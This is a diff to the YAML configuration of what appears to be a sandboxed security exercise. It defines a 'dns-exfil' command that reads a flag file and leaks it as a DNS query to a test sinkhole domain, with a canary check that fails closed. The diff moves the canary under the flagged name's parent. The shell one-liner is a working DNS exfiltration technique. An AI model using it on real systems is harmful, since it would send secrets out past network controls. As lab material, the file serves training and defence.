@@ -645,11 +645,13 @@
     # Corefile, ansible/roles/k3s/templates/coredns-sdp.yaml.j2, ADR 0026 amendment). The argv reads the
     # run's flag from the file - not from the environment - with ash builtins only, and refuses anything
     # that is not SDP{16 hex}, so the label is always `sdp-<16 hex>` and nothing else can be smuggled
-    # into the name. Before it sends that name it looks up the sinkhole's canary, ok.exfil.sdp.test,
+    # into the name. Before it sends that name it looks up the sinkhole's canary, ok.x.exfil.sdp.test,
     # and goes on only if the answer is 192.0.2.53 - which only the sinkhole gives - so a resolver
-    # without it never sees the flag (fail closed). The trailing dots stop search-domain expansion. It
-    # exits 0 only on NXDOMAIN for the flagged name (ADR 0032 amendment, D3): a quarantined pod's
-    # lookups are dropped, the command fails, and "Phone home" is not marked achieved.
+    # without it never sees the flag (fail closed). The canary sits under x.exfil.sdp.test, the flagged
+    # name's own parent, so a block that took that subtree over (and would get the flag) fails it too.
+    # The trailing dots stop search-domain expansion. It exits 0 only on NXDOMAIN for the flagged name
+    # (ADR 0032 amendment, D3): a quarantined pod's lookups are dropped, the command fails, and "Phone
+    # home" is not marked achieved.
     - id: dns-exfil
       input: "nslookup sdp-<flag>.x.exfil.sdp.test."
       aliases: ["exfil"]
@@ -659,7 +661,7 @@
         - sh
         - -c
         # yamllint disable-line rule:line-length
-        - "read -r f </srv/shop/.flag; h=${f#SDP\\{}; h=${h%\\}}; case $h in ''|*[!0-9a-f]*) echo 'no flag found'; exit 1;; esac; [ ${#h} -eq 16 ] || exit 1; c=$(nslookup -type=a ok.exfil.sdp.test. 2>&1); case $c in *'Address: 192.0.2.53'*) ;; *) echo 'sinkhole not answering, nothing sent'; exit 1;; esac; n=sdp-$h.x.exfil.sdp.test.; echo \"query $n\"; o=$(nslookup -type=a \"$n\" 2>&1); echo \"$o\"; case $o in *NXDOMAIN*) exit 0;; esac; exit 1"
+        - "read -r f </srv/shop/.flag; h=${f#SDP\\{}; h=${h%\\}}; case $h in ''|*[!0-9a-f]*) echo 'no flag found'; exit 1;; esac; [ ${#h} -eq 16 ] || exit 1; c=$(nslookup -type=a ok.x.exfil.sdp.test. 2>&1); case $c in *'Address: 192.0.2.53'*) ;; *) echo 'sinkhole not answering, nothing sent'; exit 1;; esac; n=sdp-$h.x.exfil.sdp.test.; echo \"query $n\"; o=$(nslookup -type=a \"$n\" 2>&1); echo \"$o\"; case $o in *NXDOMAIN*) exit 0;; esac; exit 1"
       tty: false
       outcome: allowed
       layer: network
